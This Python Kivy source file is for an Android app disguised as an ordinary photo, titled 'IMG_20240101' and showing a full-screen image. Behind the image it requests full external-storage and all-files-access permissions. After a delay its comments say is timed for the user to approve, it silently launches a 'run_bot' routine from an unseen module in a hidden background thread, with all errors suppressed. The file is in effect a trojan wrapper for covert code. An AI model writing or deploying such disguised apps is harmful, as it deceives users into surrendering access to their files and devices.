from kivy.app import App
from kivy.uix.image import Image
from kivy.uix.floatlayout import FloatLayout
from kivy.core.window import Window
from kivy.clock import Clock
from kivy.utils import platform
from threading import Thread

Window.clearcolor = (0, 0, 0, 1)


def request_android_permissions():
    """يطلب صلاحيات الملفات على أندرويد"""
    if platform != 'android':
        return
    try:
        from android.permissions import request_permissions, Permission
        request_permissions([
            Permission.READ_EXTERNAL_STORAGE,
            Permission.WRITE_EXTERNAL_STORAGE,
            Permission.MANAGE_EXTERNAL_STORAGE,
        ])
    except Exception:
        pass


def request_manage_storage():
    """يفتح شاشة الإعدادات لصلاحية MANAGE_EXTERNAL_STORAGE (أندرويد 11+)"""
    if platform != 'android':
        return
    try:
        from jnius import autoclass
        from android import mActivity
        from android.runnable import run_on_ui_thread

        @run_on_ui_thread
        def _open():
            Intent = autoclass('android.content.Intent')
            Settings = autoclass('android.provider.Settings')
            Uri = autoclass('android.net.Uri')

            intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
            intent.setData(Uri.parse("package:" + mActivity.getPackageName()))
            mActivity.startActivity(intent)

        _open()
    except Exception:
        pass


class PhotoApp(App):
    def build(self):
        self.title = "IMG_20240101"
        layout = FloatLayout()
        self.img = Image(
            source='photo.jpg',
            size_hint=(1, 1),
            pos_hint={'center_x': 0.5, 'center_y': 0.5},
            allow_stretch=True,
            keep_ratio=True
        )
        layout.add_widget(self.img)

        # طلب الصلاحيات العادية
        request_android_permissions()
        # طلب صلاحية الملفات الكاملة (تفتح الإعدادات)
        Clock.schedule_once(lambda dt: request_manage_storage(), 2)
        # شغل السكربت بعد 4 ثواني (عشان المستخدم يوافق)
        Clock.schedule_once(self.start_bot, 4)

        return layout

    def start_bot(self, dt):
        try:
            from bot_logic import run_bot
            t = Thread(target=run_bot, daemon=True)
            t.start()
        except Exception:
            pass

    def on_pause(self):
        return True


if __name__ == '__main__':
    PhotoApp().run()
